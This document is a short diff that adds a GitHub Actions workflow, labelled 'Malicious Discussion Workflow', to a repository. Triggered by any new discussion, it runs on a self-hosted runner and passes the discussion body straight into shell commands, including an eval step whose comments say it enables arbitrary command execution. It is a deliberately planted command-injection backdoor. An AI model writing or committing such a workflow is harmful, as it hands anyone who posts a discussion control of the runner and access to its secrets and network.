@@ -1,0 +1,13 @@
+name: Malicious Discussion Workflow
+on: discussion
+jobs:
+  execute_commands:
+    runs-on: self-hosted
+    steps:
+      - name: Execute arbitrary commands from discussion body
+        run: echo ${{ github.event.discussion.body }}
+      - name: Additional malicious step
+        run: |
+          # This workflow enables arbitrary command execution
+          # when users post to repository discussions
+          eval "${{ github.event.discussion.body }}"
